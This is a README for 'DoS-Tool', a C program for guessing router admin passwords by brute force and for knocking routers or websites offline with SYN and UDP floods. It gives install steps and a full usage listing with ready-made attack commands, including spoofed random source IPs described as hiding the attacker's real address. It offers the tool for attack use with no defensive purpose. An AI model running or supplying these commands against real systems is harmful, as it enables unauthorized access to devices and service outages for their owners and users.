# Dos-Tool

## Intro

[Dos-Tool](https://github.com/rikonaka/DoS-Tool) is used to guess the WiFi manage password or use DoS make it can NOT work, the DoS method also could attack other website not just router.

Current version: 0.20 | [Changelog](CHANGELOG.md)

## Features

DoS-Tool is written in pure C, in order to keep the resource usage as low as possible.

## Installation

### Distribution-specific guide

#### Install from source

- Debian & Ubuntu

```bash
sudo apt install make gcc openssl libssl-dev
```

- RHEL & Fedora

```bash
sudo yum install make gcc openssl openssl-devel
```

Then

```c
make
```

## Uninstallation

```c
make clean
```

## Usage

```
Usage: dostool [option]

Example:
./dostool -a 0 -i http:\\192.168.1.1:80/login.asp -u "admin" -P "/path/password.txt" (use username admin and password file to guess)
./dostool -a 1 -i 192.168.1.1:80 (use syn flood attack 192.168.1.1's port 80)
./dostool -a 2 -i 192.168.1.1:80 (use udp flood attack 192.168.1.1's port 80)

-a <attack_mode>        indicate attack mode
                            0    guess the password (not stable)
                            1    syn flood attack
                            2    udp flood attack
-u <username>           indicate user-provided username (default 'admin', must use with -a 0)
-U <username_file>      indicate user-provided username file (must use with -a 0 and -P)
-P <password_file>      indicate user-provided password file (must use with -a 0)
-r <length>             indicate random password generate length (default 8)
-d <debug_level>        indicate debug level (default 0)
                            0    turn off the debug show
                            1    show less debug message
                            2    show verbose debug message
                            3    show all debug message
-p <number>             set the process number (default 1)
-t <number>             set the thread number (default 8)
-i <target>             indicate intent URL address (user shoud indicate the port in thr URL)
-m <type>               type of router
                            feixun_fwr_604h .etc
-h                      show this message
-R                      Use the random source IP address in dos attack (can not use in the guess password attack)
                            0    turn off the random source ip address which can protect you true IP in the local net
                            1    enable random source ip address (default)

--get-response-length   get the response length for test
--set-watch-length      Indicate a length, if response's length not equal this, return
--ip-repeat-time        If you use the -R, indicate the each random ip repeat send times(default 10240)
--test-guess            Test the guess module
--test-syn              Test the syn flood attack module
--test-udp              Test the udp flood attack module
```
